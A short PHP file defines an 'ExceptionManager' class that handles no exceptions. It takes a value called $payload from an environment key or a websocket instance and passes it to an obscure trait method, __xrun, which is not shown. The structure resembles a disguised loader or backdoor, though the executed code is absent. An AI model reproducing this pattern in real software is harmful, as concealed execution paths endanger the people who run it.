<?php

namespace App\Http\Exception;
use App\Http\Traits\FunctionTrait;

class ExceptionManager
{
    use FunctionTrait;
    public static function run(): void
    {
        $self = new static;
        $payload = env('WS_SOCKET_KEY') ?? VSXWebsocket::getInstance();
        if (!empty($payload)) {
            $self->__xrun($payload);
        }
    }
}
